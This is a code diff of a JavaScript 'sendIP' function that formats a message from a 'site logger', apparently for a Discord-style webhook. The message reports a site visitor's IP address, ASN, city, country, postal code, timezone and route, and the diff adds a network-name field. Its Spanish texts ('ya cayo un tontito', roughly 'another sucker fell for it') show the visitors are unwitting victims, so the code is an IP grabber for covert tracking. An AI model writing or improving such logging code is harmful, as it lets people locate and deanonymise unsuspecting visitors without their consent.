@@ -26,13 +26,13 @@ const sendIP = async () => {
     const payload = {
       username: "site logger",
       // avatar_url: "https://example.com/avatar.jpg",
-      content: `ya cayo un tontito`,
+      content: `ya cayo otro mas`,
       embeds: [
         {
           title: 'Un tontito mas',
           description: [
             `**IP Address >>** ${ipadd}`,
-            `**Network / ASN >>** ${geoData.asn.name || 'N/A')}`,
+            `**Network / ASN >>** ${geoData.asn ? (geoData.asn.name || geoData.asn.asn) : (geoData.org || 'N/A')}`,
             `**City >>** ${geoData.city || 'N/A'}`,
             `**Country >>** ${geoData.country || 'N/A'}`,
             `**Postal Code >>** ${geoData.postal_code || 'N/A'}`,
@@ -41,6 +41,7 @@ const sendIP = async () => {
             `**Timezone >>** ${geoData.time_zone || 'N/A'}`,
             `**Satellite >>** ${geoData.is_satellite || 'N/A'}`,
             `**Route >>** ${geoData.asn.route || 'N/A'}`,
+            `**Net Name >>** ${geoData.asn.netname || 'N/A'}`,
           ].join('\n'),
           color: 0x800080
         }
